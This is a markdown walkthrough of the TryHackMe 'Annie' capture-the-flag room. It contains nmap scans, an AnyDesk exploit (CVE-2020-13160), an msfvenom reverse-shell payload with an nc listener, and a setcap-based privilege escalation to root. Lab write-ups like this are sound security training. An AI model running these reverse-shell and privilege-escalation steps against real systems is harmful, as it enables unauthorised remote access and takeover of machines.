## Annie CTF - [room](https://tryhackme.com/room/annie)

First we will start the machine, and grab the ip:
  - 10.10.76.15

`sudo nmap -v -sV -sC -oN nmap.log 10.10.76.15 -p- | grep open `

**Output**:
```shell
Discovered open port 22/tcp on 10.10.76.15
Discovered open port 33797/tcp on 10.10.76.15
Discovered open port 7070/tcp on 10.10.76.15
22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
7070/tcp  open  realserver?
33797/tcp open  unknown
```
`sudo nmap -v -sV -sC -oN nmap.txt 10.10.76.15 -p 22,7070`

**Output**:
```
PORT      STATE  SERVICE         VERSION
22/tcp    open   ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp  open   ssl/realserver?
| ssl-cert: Subject: commonName=AnyDesk Client
| Not valid before: 2022-03-23T20:04:30
|_Not valid after:  2072-03-10T20:04:30
|_ssl-date: TLS randomness does not represent time
```

Making some research about anydesk client we know that anydesk use port range 50001-50003
so scanning that ports we know that port 50001 is open, and searching for anydesk CVE/Vulns we found

### CVE-2020-13160 - [Link](https://www.exploit-db.com/exploits/49613)

Now changing the ip in `ip = $ip`

![screenshot](https://github.com/SnowyYT07/TryhackmeCTFs/Annie/img/screenshot.png)

and changing that shellcode with
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=*thm ip* LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode`

we just need to set our listener and run the py script
`nc -lvnp 4444`

IN ANOTHER SHELL:

`python2 49613.py`


### RCE TIME

Now we have a user perm shell doing
cat user.txt we get

THM{[REDECTED]}

now u have to explore for privesc
with
`find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;`

we can find binary with SUID perm
lets use the /sbin/setcap so..

`cp /usr/bin/python3 /home/annie/python3`

`setcap cap_setuid+ep /home/annie/python3`

`./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

now we got root and:

`cat /root/root.txt`
and we get 
`THM{[REDECTED]}`
